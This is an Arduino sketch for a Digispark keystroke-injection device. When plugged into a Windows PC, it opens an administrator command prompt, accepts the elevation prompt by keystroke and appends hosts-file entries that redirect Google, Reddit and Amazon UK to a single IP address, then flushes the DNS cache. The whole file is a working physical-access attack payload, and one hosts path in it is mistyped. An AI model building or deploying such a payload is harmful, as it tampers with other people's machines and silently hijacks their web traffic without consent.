#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  //This opens an administrator command prompt
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  //Adds the set websites & ips to the hosts file in windows, currently all redirect to dell
  DigiKeyboard.println("ECHO 143.166.83.38 www.google.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 143.166.83.38 google.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 143.166.83.38 www.reddit.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 143.166.83.38 reddit.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 143.166.83.38 www.amazon.co.uk >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 143.166.83.38 amazon.co.uk >> C:/SYSTEM32/DRIVERS/ETC/HOSTS");
  //clears dns cache
  DigiKeyboard.println("ipconfig /flushdns");
  //exits the terminal
  DigiKeyboard.println("exit");
  for(;;){ /*empty*/ }
}
